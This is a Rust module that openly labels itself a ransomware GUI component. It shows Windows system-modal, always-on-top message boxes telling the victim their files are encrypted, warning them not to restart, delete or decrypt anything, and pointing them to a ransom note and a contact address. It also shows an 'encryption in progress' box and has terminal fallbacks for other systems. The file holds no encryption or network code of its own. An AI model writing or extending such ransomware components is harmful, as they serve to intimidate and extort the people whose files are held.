/// Ransomware GUI dialog module
/// Creates persistent Windows dialogs for ransom messages

#[cfg(target_os = "windows")]
pub fn show_ransom_dialog(key_hint: &str) -> Result<(), String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONWARNING, MB_SYSTEMMODAL, MB_TOPMOST};
    use std::ptr;
    
    let title = wide_string("🔒 SYSTEM ENCRYPTED");
    let message_text = format!(
        "⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️\n\n\
         All your important files are now encrypted with military-grade encryption.\n\n\
         🔑 Key ID: {}...\n\n\
         📝 Check RANSOM_NOTE.txt in the encrypted directories for instructions.\n\n\
         ❌ DO NOT restart or shutdown your computer\n\
         ❌ DO NOT delete any files\n\
         ❌ DO NOT attempt to decrypt manually\n\n\
         Your files can be recovered with the correct decryption key.\n\
         Contact EMAIL for assistance.",
        &key_hint[..16.min(key_hint.len())]
    );
    let message = wide_string(&message_text);
    
    unsafe {
        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL | MB_TOPMOST
        );
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
pub fn show_encryption_progress_dialog(files_count: usize) -> Result<(), String> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONINFORMATION, MB_TOPMOST};
    use std::ptr;
    
    let title = wide_string("🔄 Encryption in Progress");
    let message_text = format!(
        "Please wait...\n\n\
         Processing {} files\n\
         This may take a few moments.\n\n\
         Do not close this window or shutdown your computer.",
        files_count
    );
    let message = wide_string(&message_text);
    
    unsafe {
        MessageBoxW(
            ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONINFORMATION | MB_TOPMOST
        );
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn wide_string(s: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

#[cfg(not(target_os = "windows"))]
pub fn show_ransom_dialog(_key_hint: &str) -> Result<(), String> {
    println!("\n╔═══════════════════════════════════════════════════════════╗");
    println!("║                                                           ║");
    println!("║         YOUR FILES HAVE BEEN ENCRYPTED                    ║");
    println!("║                                                           ║");
    println!("╚═══════════════════════════════════════════════════════════╝");
    println!("\nCheck RANSOM_NOTE.txt for instructions.");
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn show_encryption_progress_dialog(_files_count: usize) -> Result<(), String> {
    println!("Encryption in progress...");
    Ok(())
}
